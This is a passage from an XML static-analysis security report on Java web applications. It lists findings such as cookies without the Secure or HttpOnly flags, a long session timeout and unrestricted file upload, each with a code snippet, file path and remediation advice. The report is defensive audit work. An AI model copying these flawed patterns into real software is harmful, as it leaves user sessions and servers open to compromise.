		String fileContent = new String(byteContent);
		return fileContent;
	}</Snippet>
<TargetFunction>String()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Code Correctness: Class Does Not Implement Cloneable</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The class AppMessage implements a clone() method but does not implement the Cloneable interface.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It appears that the programmer intended for this class to implement the Cloneable interface because it implements a method named clone(). However, the class does not implement the Cloneable interface and the clone() method will not behave correctly.

Example 1: Calling clone() for this class will result in a CloneNotSupportedException.


public class Kibitzer {
  public Object clone() throws CloneNotSupportedException {
    ...
  }
}

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Implement both the Cloneable interface and the clone() method.

Example 2: The code in Example 1 could be rewritten in the following way:


public class Kibitzer implements Cloneable {
  public Object clone() throws CloneNotSupportedException {
    ...
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8D8E72258E842567D62135C5AA34DE2B" ruleID="077F32BE-5961-475A-B330-AFADABE800BB">
                            <Category>Code Correctness: Class Does Not Implement Cloneable</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The class AppMessage implements a clone() method but does not implement the Cloneable interface.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppMessage.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/AppMessage.java</FilePath>
<LineStart>76</LineStart>
<Snippet>        * @see java.lang.Object#clone()
        */
       public Object clone()
       {
    	   AppMessage l_objAppMsg = new AppMessage(m_sMsgVal, m_iMsgType);</Snippet>
<TargetFunction>Function: clone()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Code Correctness: null Argument to equals()</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The expression obj.equals(null) will always be false.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The program uses the equals() method to compare an object with null. This comparison will always return false, since the object is not null. (If the object is null, the program will throw a NullPointerException).</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>It is possible that the programmer intended to check to see if the object was null. Instead of writing

obj.equals(null)

they intended

obj == null
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3011AFA7E6B5160809DC63C95E21DFA7" ruleID="025598A6-0467-4269-B7F0-F47E544B7327">
                            <Category>Code Correctness: null Argument to equals()</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression obj.equals(null) will always be false.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityAccessManager.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityAccessManager.java</FilePath>
<LineStart>1738</LineStart>
<Snippet>        UserAuthenticationData l_objAuthData = p_objUserAuthenticationData;

        boolean b_bIsGuest = (l_objAuthData.m_sUserId.equals(
                CNSIConstants.VAR_GUEST_USER_LOGIN_ID) &amp;&amp;
                l_objAuthData.m_sUserDomainName.equalsIgnoreCase(</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Cookie Security: Cookie not Sent Over SSL</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>A cookie is created without the secure flag set to true.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Modern web browsers support a secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.
  

Example 1: In the following example, a cookie is added to the response without setting the secure flag.

	Cookie cookie = new Cookie("emailCookie", email);
	response.addCookie(cookie);


If your application uses both HTTPS and HTTP but does not set the secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Set the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. Do this by calling setSecure(true).

Example 2:

	Cookie cookie = new Cookie("emailCookie", email);
	cookie.setSecure(true);
	response.addCookie(cookie);
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="181227B6DE6573A5ACAD0100EA2BBA35" ruleID="AC87E716-8766-4F78-8851-86354C03A13B">
                            <Category>Cookie Security: Cookie not Sent Over SSL</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>A cookie is created without the secure flag set to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/CNSIControlServlet.java</FilePath>
<LineStart>460</LineStart>
<Snippet>        		//l_objCookie.setHttpOnly(this.cookieHttpOnly);
        		l_objCookie.setPath(";Path=/;HttpOnly;");
        		p_objHttpServletResponse.addCookie(l_objCookie);
			}
                       </Snippet>
<TargetFunction>addCookie(l_objCookie)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Cookie Security: HTTPOnly not Set</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The program creates a cookie in CNSIControlServlet.java at line 454, but fails to set the HttpOnly flag to true.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.


Example 1: The following code creates a cookie without setting the HttpOnly property.

javax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie("emailCookie", email);
// Missing a call to: cookie.setHttpOnly(true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Enable the HttpOnly property when you create cookies. Do this by calling, in the case of javax.servlet.http.Cookie, the setHttpOnly(boolean) method with the argument true.

Example 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.

javax.servlet.http.Cookie cookie = new javax.servlet.http.Cookie("emailCookie", email);
cookie.setHttpOnly(true);


Several mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="150020EF91B991793827BA6ADD7472A7" ruleID="1733FB59-CC13-4E99-9638-3D45FEEE9BE1">
                            <Category>Cookie Security: HTTPOnly not Set</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The program creates a cookie in CNSIControlServlet.java at line 454, but fails to set the HttpOnly flag to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/CNSIControlServlet.java</FilePath>
<LineStart>454</LineStart>
<Snippet>         		String l_sUUID = createNewToken();
        		l_objSession.setAttribute("csrfSessionToken", l_sUUID);
        		Cookie l_objCookie = new Cookie(this.cookieName, l_sUUID);
        		l_objCookie.setSecure(p_objHttpServletRequest.isSecure());
        		l_objCookie.setPath(p_objHttpServletRequest.getContextPath() + "/");</Snippet>
<TargetFunction>l_objCookie = new Cookie(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Cookie Security: Persistent Cookie</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Most Web programming environments default to creating non-persistent cookies. These cookies reside only in browser memory (they are not written to disk) and are lost when the browser is closed. Programmers can specify that cookies be persisted across browser sessions until some future date. Such cookies are written to disk and survive across browser sessions and computer restarts.

If private information is stored in persistent cookies, attackers have a larger time window in which to steal this data - especially since persistent cookies are often set to expire in the distant future. Persistent cookies are often used to profile users as they interact with a site. Depending on what is done with this tracking data, it is possible to use persistent cookies to violate users' privacy.


Example: The following code sets a cookie to expire in 10 years.

	Cookie cookie = new Cookie("emailCookie", email);
	cookie.setMaxAge(60*60*24*365*10);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Do not store sensitive data in persistent cookies. Be sure that any data associated with a persistent cookie stored on the server side is purged within a reasonable amount of time.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="16574D85FFD0F7CFF453F06006BFD144" ruleID="864C76F4-4D0F-4676-BAD7-41523845E5B2">
                            <Category>Cookie Security: Persistent Cookie</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/CNSIControlServlet.java</FilePath>
<LineStart>457</LineStart>
<Snippet>        		l_objCookie.setSecure(p_objHttpServletRequest.isSecure());
        		l_objCookie.setPath(p_objHttpServletRequest.getContextPath() + "/");
        		l_objCookie.setMaxAge((l_sUUID != null) ? this.cookieMaxAge : 0);
        		//l_objCookie.setHttpOnly(this.cookieHttpOnly);
        		l_objCookie.setPath(";Path=/;HttpOnly;");</Snippet>
<TargetFunction>setMaxAge()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>EJB Bad Practices: Use of AWT/Swing</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method logSecurityAuditData() in SecurityBean.java violates the Enterprise JavaBeans specification by using AWT/Swing. </Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container [1].

In this case, the program violates the following EJB guideline:

"An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard."

A requirement that the specification justifies in the following way:

"Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system."</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>In order to ensure portability and consistent behavior across multiple deployment environments strictly adhere to guidelines proposed in the Enterprise JavaBeans specification.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="56FC0DBF66EBA47ADAE59722D0A3D1EE" ruleID="4446CF9D-398A-4545-A79B-F2F97FA0FAD6">
                            <Category>EJB Bad Practices: Use of AWT/Swing</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method logSecurityAuditData() in SecurityBean.java violates the Enterprise JavaBeans specification by using AWT/Swing. </Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SecurityBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java</FilePath>
<LineStart>861</LineStart>
<Snippet>					p_objSecAuditData.m_sSessionID);
			l_mapParams.put(CNSIDataDictionary.USER_ACCOUNT_AUDIT.USER_LOGIN_ID, b_sUserLoginId);
			SecurityDAO.logSecurityAuditData(l_objConn, l_mapParams, p_objUserDet);
		}
		catch (Exception ex) {</Snippet>
<TargetFunction>FunctionCall: logSecurityAuditData()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Excessive Session Timeout</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>An overly long session timeout gives attackers more time to potentially compromise user accounts.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The longer a session stays open, the larger the window of opportunity an attacker has to compromise user accounts. While a session remains active, an attacker may be able to brute-force a user's password, crack a user's wireless encryption key, or commandeer a session from an open browser. Longer session timeouts can also prevent memory from being released and eventually result in a denial of service if a sufficiently large number of sessions are created.

Example 1: If the session timeout is zero or less than zero, the session never expires. The following example shows a session timeout set to -1, which will cause the session to remain active indefinitely.

&lt;session-config&gt;
    &lt;session-timeout&gt;-1&lt;/session-timeout&gt;
&lt;/session-config&gt;


The &lt;session-timeout&gt; tag defines the default session timeout interval for all sessions in the web application. If the &lt;session-timeout&gt; tag is missing, it is left to the container to set the default timeout.
This category was derived from the Cigital Java Rulepack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Set a session timeout that is 30 minutes or less, which both allows users to interact with the application over a period of time and provides a reasonable bound for the window of attack.

Example 2: The following example sets the session timeout to 20 minutes.

&lt;session-config&gt;
  &lt;session-timeout&gt;20&lt;/session-timeout&gt;
&lt;/session-config&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C2F39B963AB1AFACD8D57325EEAF747F" ruleID="B7ED276F-524D-444B-8930-7D77535BF0D0">
                            <Category>J2EE Misconfiguration: Excessive Session Timeout</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>An overly long session timeout gives attackers more time to potentially compromise user accounts.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>XML/web.xml</FilePath>
<LineStart>65</LineStart>
<Snippet>    
	
    &lt;session-config&gt;
        &lt;session-timeout&gt;
            &lt;!-- time expressed in minutes. This should be greater than application ideal time out by 5 mts. --&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Missing Servlet Mapping</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>A Servlet defined in web.xml cannot be accessed without a corresponding servlet mapping.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The absence of a valid servlet mapping prevents all access to the unmapped servlet.



Example 1: The following entry from web.xml defines ExampleServlet but fails to define a corresponding servlet mapping.

&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4"&gt;

    &lt;servlet&gt;
      &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;
      &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;
      &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;

&lt;/web-app&gt;

This category is from the Cigital Java Rulepack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Ensure that every &lt;servlet&gt; has a corresponding &lt;servlet-mapping&gt;.

Example 2:  The following entry from web.xml defines ExampleServlet and a corresponding servlet mapping.

&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4"&gt;
    &lt;servlet&gt;
        &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;
        &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/exampleservlet&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;

    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;action&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/action&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
&lt;/web-app&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5E91D4245219FB0BEA8CCB65B50465D4" ruleID="8BA3B029-5DB0-434D-B202-D31FF2B64665">
                            <Category>J2EE Misconfiguration: Missing Servlet Mapping</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>A Servlet defined in web.xml cannot be accessed without a corresponding servlet mapping.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>EHR-WEBAPP/WEB-INF/web.xml</FilePath>
<LineStart>15</LineStart>
<Snippet>		talekarp 05/04/2006
	--&gt;
	&lt;servlet&gt;
    	&lt;servlet-name&gt;JUnitEETestServlet&lt;/servlet-name&gt;
	    &lt;description&gt;JUnitEE test framework&lt;/description&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Object Model Violation: Erroneous clone() Method</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The implementation of clone() at AppMessage.java line 76 should call super.clone() to obtain a new object.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>All implementations of clone() should obtain the new object by calling super.clone(). If a class fails to follow this convention, a subclass's clone() method will return an object of the wrong type.


Example 1: The following two classes demonstrate a bug introduced by failing to call super.clone(). Because of the way Kibitzer implements clone(), FancyKibitzer's clone method will return an object of type Kibitzer instead of FancyKibitzer.


public class Kibitzer implements Cloneable {
  public Object clone() throws CloneNotSupportedException {
    Object returnMe = new Kibitzer();
    ...
  }
}

public class FancyKibitzer extends Kibitzer
                           implements Cloneable {
  public Object clone() throws CloneNotSupportedException {
    Object returnMe = super.clone();
    ...
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Always obtain the new object by calling super.clone(). The java.lang.Object implementation of clone() will always return an object of the correct type.

Example 2: The code in Example 1 could be rewritten in the following way:


public class Kibitzer implements Cloneable {
  public Object clone() throws CloneNotSupportedException {
    Object returnMe = super.clone();
    ...
  }
}

public class FancyKibitzer extends Kibitzer
                           implements Cloneable {
  public Object clone() throws CloneNotSupportedException {
    Object returnMe = super.clone();
    ...
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="47B620346CCD6C4D8405A4F804BEC94B" ruleID="5A66F798-0D0E-42A0-A347-CC62EFFA168F">
                            <Category>Object Model Violation: Erroneous clone() Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The implementation of clone() at AppMessage.java line 76 should call super.clone() to obtain a new object.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppMessage.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/AppMessage.java</FilePath>
<LineStart>76</LineStart>
<Snippet>        * @see java.lang.Object#clone()
        */
       public Object clone()
       {
    	   AppMessage l_objAppMsg = new AppMessage(m_sMsgVal, m_iMsgType);</Snippet>
<TargetFunction>Function: clone()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Often Misused: File Upload</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function &lt;a href="location://CNSI-JAR/src/com/cnsi/common/multipartrequest/MultipartRequest.java###142###26###0"&gt;ServletFileUpload()&lt;/a&gt; in MultipartRequest.java on line 142 retrieves attachments from a SOAP message. Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Regardless of the language in which a program is written, the most devastating attacks often involve remote code execution, whereby an attacker succeeds in executing malicious code in the program's context. If attackers are allowed to upload files to a publicly executable directory, then they can cause malicious code contained in these files to execute on the server.

Example: The following code uses Apache Commons FileUpload to handle uploaded files.

FileItemFactory factory = new DiskFileItemFactory();
// Create a new file upload handler
ServletFileUpload upload = new ServletFileUpload(factory);
List items = upload.parseRequest(request);


Even if a program stores uploaded files under a directory that isn't publicly accessible, attackers might still be able to leverage the ability to introduce malicious content into the server environment to mount other attacks. If the program is susceptible to path manipulation, command injection, or remote include vulnerabilities, then an attacker might upload a file with malicious content and cause the program to read or execute it by exploiting another vulnerability.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Do not accept attachments if they can be avoided. If a program must accept attachments, then restrict the ability of an attacker to supply malicious content by only accepting the specific types of content the program expects. Most attacks that rely on uploaded content require that attackers be able to supply content of their choosing. Placing restrictions on the content the program will accept will greatly limit the range of possible attacks. Check file names, extensions, and file content to make sure they are all expected and acceptable for use by the application. Make it difficult for the attacker to determine the name and location of uploaded files. Such solutions are often program-specific and vary from storing uploaded files in a directory with a name generated from a strong random value when the program is initialized, to assigning each uploaded file a random name and tracking them with entries in a database [1].</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7ABCF8CA0EF47E645953CD8A622796B1" ruleID="F316970C-9FEF-4C7A-B94C-6560E690C3B4">
                            <Category>Often Misused: File Upload</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The function &lt;a href="location://CNSI-JAR/src/com/cnsi/common/multipartrequest/MultipartRequest.java###142###26###0"&gt;ServletFileUpload()&lt;/a&gt; in MultipartRequest.java on line 142 retrieves attachments from a SOAP message. Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>MultipartRequest.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/multipartrequest/MultipartRequest.java</FilePath>
<LineStart>142</LineStart>
<Snippet>    	l_objDiskFactory.setSizeThreshold(500*1024);
    	
    	l_objUploadObject = new ServletFileUpload(l_objDiskFactory);

    	//get a list of all the items which contains the form fields and </Snippet>
<TargetFunction>ServletFileUpload()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Logging Practice: Logger Not Declared Static Final</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The class CNSIApacheLogImpl should declare its logger to be static and final.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is good programming practice to share a single logger object between all of the instances of a particular class and to use the same logger for the duration of the program.

Example 1: The following statement errantly declares a non-static logger.


private final Logger logger =
            Logger.getLogger(MyClass.class);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Declare loggers to be static and final.

Example 2: The code in Example 1 could be rewritten in the following way:


private final static Logger logger =
            Logger.getLogger(MyClass.class);
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
